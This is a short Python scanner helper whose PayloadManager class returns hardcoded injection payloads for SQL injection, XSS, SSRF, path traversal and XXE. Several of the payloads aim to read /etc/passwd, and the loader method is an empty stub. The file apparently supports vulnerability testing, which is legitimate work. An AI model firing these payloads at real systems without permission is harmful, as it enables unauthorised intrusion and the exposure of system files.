import json
import os
from urllib.parse import urlparse

class PayloadManager:
    def __init__(self):
        self.payloads = {}

    def load_payloads(self, payload_dir):
        pass

    def get_payloads(self, vuln_type, count=100):
        payloads = {
            'sqli': ["' OR '1'='1", "' OR '1'='1'--", "' UNION SELECT NULL--", "1' AND '1'='1"],
            'xss': ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>'],
            'ssrf': ['http://127.0.0.1:80', 'http://localhost:80', 'file:///etc/passwd'],
            'lfi': ['../../../etc/passwd', '....//....//etc/passwd', '/etc/passwd'],
            'xxe': ['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'],
        }
        return payloads.get(vuln_type, ['test'])*count